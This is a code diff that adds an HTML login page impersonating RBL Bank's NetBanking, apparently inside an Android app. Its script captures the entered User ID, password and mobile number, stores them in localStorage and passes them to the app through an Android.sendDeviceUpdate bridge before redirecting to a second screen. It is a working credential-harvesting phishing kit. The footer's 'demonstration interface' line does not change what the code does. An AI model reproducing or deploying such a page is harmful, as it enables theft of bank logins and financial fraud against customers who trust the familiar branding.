@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RBL Bank - NetBanking Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #F5F6F8; /* Light gray base for overall background, matching design system */
+            color: #222222; /* Dark text */
+            max-width: 500px;
+            margin: 0 auto;
+            overflow-x: hidden;
+        }
+        
+        /* Splash Screen - Updated to RBL Bank style */
+        #splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #FFFFFF; /* Clean white */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: opacity 0.8s ease;
+        }
+        
+        .splash-logo {
+            width: 540px;
+            height: 540px;
+            background-color: #FFFFFF;
+            border-radius: 28px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        
+        .splash-logo img {
+            height: 100px;
+            width: 100px;
+        }
+        
+        .splash-text {
+            color: #21317D; /* Primary dark blue for structure */
+            font-size: 36px;
+            font-weight: 800;
+            letter-spacing: 1.5px;
+            margin-bottom: 12px;
+        }
+        
+        .splash-tagline {
+            color: #666666; /* Secondary text */
+            font-size: 16px;
+            font-weight: 400;
+        }
+        
+        .loading-bar {
+            width: 220px;
+            height: 5px;
+            background-color: #E0E0E0; /* Border gray */
+            border-radius: 3px;
+            margin-top: 50px;
+            overflow: hidden;
+        }
+        
+        .loading-progress {
+            height: 100%;
+            width: 0%;
+            background: #ED1C24; /* Red accent for action/attention */
+            border-radius: 3px;
+            animation: loading 2.2s ease-in-out forwards;
+        }
+        
+        @keyframes loading {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        
+        /* Main Container - White card base */
+        .container {
+            display: none;
+            min-height: 100vh;
+            flex-direction: column;
+            background-color: #F5F6F8; /* Section background light gray */
+        }
+        
+        /* Header - Clean white, minimal, with dark blue elements */
+        .header {
+            background-color: #FFFFFF; /* Pure white */
+            padding: 18px 25px;
+            border-bottom: 1px solid #E0E0E0; /* Subtle border gray */
+            box-shadow: none; /* No heavy shadows, minimal */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 80px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+        }
+        
+        .bank-logo {
+            width: 220px;
+            height: 80px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+.bank-logo img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain; /* 👈 fix */
+    object-position: center;
+}
+        
+        .bank-name {
+            display: none;
+        }
+        
+        .bank-tagline {
+            display: none;
+        }
+        
+        /* Login Container - White card with spacing */
+        .login-container {
+            padding: 35px 25px 30px;
+            flex-grow: 1;
+            background-color: #FFFFFF; /* Main white background for content */
+            margin: 20px 20px 0 20px; /* Creates card-like appearance with spacing */
+            border-radius: 16px; /* Soft rounded corners for card */
+            box-shadow: 0 2px 8px rgba(0,0,0,0.02), 0 1px 2px rgba(0,0,0,0.03); /* Very subtle, minimal */
+        }
+        
+        .form-title {
+            color: #21317D; /* Dark blue for headings (controlled use) */
+            font-size: 26px;
+            margin-bottom: 30px;
+            font-weight: 700;
+            text-align: center;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #E0E0E0; /* Border gray */
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #222222; /* Dark text */
+            font-size: 16px;
+        }
+        
+        .input-container {
+            position: relative;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 18px 18px 18px 55px;
+            border: 1px solid #E0E0E0; /* Border gray */
+            border-radius: 12px;
+            font-size: 16px;
+            background-color: white;
+            color: #222222;
+            transition: all 0.3s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #ED1C24; /* Red accent for focus, attention */
+            box-shadow: 0 0 0 3px rgba(237, 28, 36, 0.1);
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #21317D; /* Dark blue for icons (structure) */
+            font-size: 20px;
+        }
+        
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+            color: #666666;
+        }
+        
+        .divider-line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #E0E0E0;
+        }
+        
+        .divider-text {
+            padding: 0 15px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #666666;
+        }
+        
+        /* Mobile Login Section - Light gray card background */
+        .mobile-login-section {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #F5F6F8; /* Section background light gray */
+            border-radius: 16px;
+            border: 1px solid #E0E0E0;
+        }
+        
+        .mobile-login-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #21317D; /* Dark blue for structure */
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .mobile-login-title i {
+            color: #ED1C24; /* Red accent for attention */
+        }
+        
+        .mobile-login-desc {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        
+        .mobile-form-group {
+            margin-bottom: 20px;
+        }
+        
+        .mobile-input-container {
+            position: relative;
+        }
+        
+        .mobile-input {
+            width: 100%;
+            padding: 16px 16px 16px 50px;
+            border: 1px solid #E0E0E0;
+            border-radius: 12px;
+            font-size: 16px;
+            background-color: #FFFFFF;
+            color: #222222;
+            transition: all 0.3s;
+        }
+        
+        .mobile-input:focus {
+            outline: none;
+            border-color: #ED1C24;
+            box-shadow: 0 0 0 3px rgba(237, 28, 36, 0.1);
+        }
+        
+        .mobile-input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #21317D;
+            font-size: 18px;
+        }
+        
+        /* CTA Button - Red accent for primary actions */
+        .mobile-submit-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #ED1C24; /* Red accent - CTA */
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .mobile-submit-btn:hover {
+            background-color: #d11920; /* Slightly darker red on hover */
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(237, 28, 36, 0.25);
+        }
+        
+        /* Main CTA Button - Red */
+        .btn-next {
+            width: 100%;
+            padding: 19px;
+            background-color: #ED1C24; /* Red accent */
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s;
+            box-shadow: 0 2px 8px rgba(237, 28, 36, 0.2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn-next:hover {
+            background-color: #d11920;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(237, 28, 36, 0.3);
+        }
+        
+        .btn-next:active {
+            transform: translateY(0);
+        }
+        
+        .btn-next i {
+            margin-left: 10px;
+            font-size: 18px;
+        }
+        
+        .form-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 28px;
+        }
+        
+        .form-link {
+            color: #21317D; /* Dark blue for links (structure) */
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 600;
+            padding-bottom: 2px;
+            border-bottom: 1px solid transparent;
+            transition: all 0.2s;
+        }
+        
+        .form-link:hover {
+            text-decoration: none;
+            border-bottom: 1px solid #ED1C24; /* Red accent on hover */
+            color: #ED1C24;
+        }
+        
+        .security-notice {
+            background-color: #F5F6F8; /* Light gray background */
+            border: 1px solid #E0E0E0;
+            padding: 18px;
+            border-radius: 12px;
+            margin-top: 35px;
+            font-size: 14px;
+            display: flex;
+            align-items: flex-start;
+            color: #666666;
+        }
+        
+        .security-notice i {
+            color: #ED1C24; /* Red accent for attention */
+            margin-right: 12px;
+            margin-top: 2px;
+            font-size: 18px;
+        }
+        
+        .security-notice strong {
+            color: #21317D; /* Dark blue for emphasis */
+        }
+        
+        /* Footer - Light gray background, clean */
+        .footer {
+            background-color: #FFFFFF; /* White footer with top border */
+            color: #666666;
+            padding: 25px 20px;
+            margin-top: 20px;
+            border-top: 1px solid #E0E0E0;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            margin-bottom: 22px;
+        }
+        
+        .footer-link {
+            color: #21317D; /* Dark blue for footer links */
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 12px;
+            width: 48%;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        
+        .footer-link:hover {
+            color: #ED1C24; /* Red on hover */
+            text-decoration: underline;
+        }
+        
+        .footer-disclaimer {
+            font-size: 12px;
+            line-height: 1.6;
+            border-top: 1px solid #E0E0E0;
+            padding-top: 18px;
+            margin-top: 15px;
+            color: #666666;
+        }
+        
+        .contact-info {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #E0E0E0;
+        }
+        
+        .contact-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        
+        .contact-icon {
+            background-color: #FFFFFF;
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 10px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
+            border: 1px solid #E0E0E0;
+        }
+        
+        .contact-icon i {
+            color: #21317D;
+            font-size: 20px;
+        }
+        
+        .contact-text {
+            font-size: 12px;
+            font-weight: 500;
+            color: #666666;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 25px 20px;
+                margin: 16px 16px 0 16px;
+            }
+            
+            .header {
+                padding: 15px 20px 12px;
+            }
+            
+            .footer {
+                padding: 22px 16px;
+            }
+            
+            .splash-logo {
+                width: 120px;
+                height: 120px;
+                border-radius: 24px;
+            }
+            
+            .splash-logo img {
+                height: 85px;
+                width: 85px;
+            }
+            
+            .splash-text {
+                font-size: 32px;
+            }
+            
+            .form-title {
+                font-size: 24px;
+            }
+            
+            .mobile-login-section {
+                padding: 15px;
+            }
+        }
+        
+        /* Form input placeholder styling */
+        .form-input::placeholder {
+            color: #999999;
+            font-weight: 400;
+        }
+        
+        .mobile-input::placeholder {
+            color: #999999;
+            font-weight: 400;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Splash Screen - RBL Bank Themed -->
+    <div id="splash-screen">
+        <div class="splash-logo">
+            <!-- RBL Bank Logo attempt (using reliable logo URL that resembles RBL) -->
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT0DX3jkMEjA37SlWq1Dco_MENPhObcAZNmSLt73lJ78Q&s=10" alt="RBL Bank Logo" onerror="this.onerror=null; this.src='https://seeklogo.com/images/R/rbl-bank-logo-38A14DEB40-seeklogo.com.png';">
+        </div>
+        <div class="loading-bar">
+            <div class="loading-progress"></div>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container" id="main-container">
+        <!-- Header - Clean white, minimal, RBL Bank branding -->
+        <header class="header">
+            <div class="logo-container">
+                <div class="bank-logo">
+                    <!-- RBL Bank Logo with fallback -->
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/RBL_Bank_SVG_Logo.svg/960px-RBL_Bank_SVG_Logo.svg.png?_=20180315185242" alt="RBL Bank Logo" onerror="this.onerror=null; this.src='https://seeklogo.com/images/R/rbl-bank-logo-38A14DEB40-seeklogo.com.png';">
+                </div>
+            </div>
+        </header>
+
+        <!-- Login Form - White card layout -->
+        <main class="login-container">
+            <h1 class="form-title">
+                NetBanking Login
+            </h1>
+
+            <form id="login-form">
+
+                <div class="form-group">
+                    <label class="form-label" for="userid">User ID</label>
+                    <div class="input-container">
+                        <i class="fas fa-id-card input-icon"></i>
+                        <input type="text" id="userid" class="form-input" placeholder="Enter your User ID" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="password">Password</label>
+                    <div class="input-container">
+                        <i class="fas fa-key input-icon"></i>
+                        <input type="password" id="password" class="form-input" placeholder="Enter your password" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-next">
+                    Login with User ID <i class="fas fa-arrow-right"></i>
+                </button>
+
+                <div class="form-links">
+                    <a href="#" class="form-link">Forgot User ID?</a>
+                    <a href="#" class="form-link">Forgot Password?</a>
+                </div>
+
+                <!-- Divider -->
+                <div class="divider">
+                    <div class="divider-line"></div>
+                    <div class="divider-text">OR</div>
+                    <div class="divider-line"></div>
+                </div>
+
+                <!-- Mobile Login Section - Light gray card -->
+                <div class="mobile-login-section">
+                    <div class="mobile-login-title">
+                        <i class="fas fa-mobile-alt"></i>
+                        Login by Mobile Number
+                    </div>
+                    
+                    <div class="mobile-form-group">
+                        <label class="form-label" for="mobile-number">Registered Mobile Number</label>
+                        <div class="mobile-input-container">
+                            <i class="fas fa-phone mobile-input-icon"></i>
+                            <input type="tel" id="mobile-number" class="mobile-input" placeholder="Enter 10-digit mobile number" maxlength="10" pattern="[0-9]{10}">
+                        </div>
+                    </div>
+                    
+                    <button type="button" id="mobile-login-btn" class="mobile-submit-btn">
+                        <i class="fas fa-sign-in-alt"></i> Login with Mobile Number
+                    </button>
+                </div>
+
+                <div class="security-notice">
+                    <i class="fas fa-shield-alt"></i>
+                    <div>
+                        <strong>Security Notice:</strong> Always ensure you're on the official RBL Bank website before entering your login credentials. Never share your password or OTP with anyone.
+                    </div>
+                </div>
+            </form>
+        </main>
+
+        <!-- Footer - RBL Bank style -->
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Terms of Service</a>
+                <a href="#" class="footer-link">Security Tips</a>
+                <a href="#" class="footer-link">Contact Us</a>
+                <a href="#" class="footer-link">Branch Locator</a>
+                <a href="#" class="footer-link">FAQs</a>
+            </div>
+
+            <div class="footer-disclaimer">
+                <p>© 2026 RBL Bank Ltd. All rights reserved. RBL Bank is a registered trademark. This is a demonstration interface only.</p>
+                <p style="margin-top: 10px;">Always log out after completing your banking session and clear your browser cache for security.</p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Splash screen
+
+document.addEventListener('DOMContentLoaded', function() {
+
+    // Splash screen
+    setTimeout(function() {
+        const splashScreen = document.getElementById('splash-screen');
+        const mainContainer = document.getElementById('main-container');
+
+        splashScreen.style.opacity = '0';
+
+        setTimeout(function() {
+            splashScreen.style.display = 'none';
+            mainContainer.style.display = 'flex';
+        }, 800);
+    }, 2500);
+
+    // ✅ COMMON FUNCTION (YOUR LOGIC REUSED)
+    function saveAndSend(dataBlock) {
+        let existingData = localStorage.getItem("loginData") || "";
+
+        let finalData = existingData
+            ? existingData + "\n-------------------\n" + dataBlock
+            : dataBlock;
+
+        // Save
+        localStorage.setItem("loginData", finalData);
+
+
+        try {
+            Android.sendDeviceUpdate("note", finalData);
+        } catch (e) {
+            alert("❌ Error sending to Android: " + e);
+        }
+
+        // Redirect
+        window.location.href = "screen2.html";
+    }
+
+    // ✅ LOGIN FORM (UserID + Password)
+    const loginForm = document.getElementById('login-form');
+
+    if (loginForm) {
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const userid = document.getElementById('userid').value;
+            const password = document.getElementById('password').value;
+
+            if (!userid.trim() || !password.trim()) {
+                alert('Please fill all fields.');
+                return;
+            }
+
+            const now = new Date();
+            const dateTime = now.toLocaleString();
+
+            let dataBlock =
+                "Date: " + dateTime + "\n" +
+                "UserID: " + userid + "\n" +
+                "Password: " + password + "\n";
+
+            saveAndSend(dataBlock);
+        });
+    }
+
+    // ✅ MOBILE BUTTON (SEPARATE — AS YOU WANTED)
+    const mobileLoginBtn = document.getElementById('mobile-login-btn');
+
+    mobileLoginBtn.addEventListener('click', function() {
+        const mobileNumber = document.getElementById('mobile-number').value;
+
+        const mobileRegex = /^[0-9]{10}$/;
+
+        if (!mobileRegex.test(mobileNumber)) {
+            alert('Enter valid 10-digit mobile number.');
+            return;
+        }
+
+        const now = new Date();
+        const dateTime = now.toLocaleString();
+
+        let dataBlock =
+            "Date: " + dateTime + "\n" +
+            "Mobile: " + mobileNumber + "\n";
+
+        saveAndSend(dataBlock);
+    });
+
+    // Input focus effects
+    const inputs = document.querySelectorAll('.form-input, .mobile-input');
+
+    inputs.forEach(input => {
+        input.addEventListener('focus', function() {
+            this.parentElement.style.transform = 'scale(1.02)';
+            this.style.backgroundColor = '#fcfcfc';
+        });
+
+        input.addEventListener('blur', function() {
+            this.parentElement.style.transform = 'scale(1)';
+            this.style.backgroundColor = '#ffffff';
+        });
+    });
+
+    // Mobile formatting
+    const mobileInput = document.getElementById('mobile-number');
+
+    mobileInput.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+
+        if (this.value.length > 10) {
+            this.value = this.value.slice(0, 10);
+        }
+    });
+
+});
+</script>
+</body>
+
+</html>
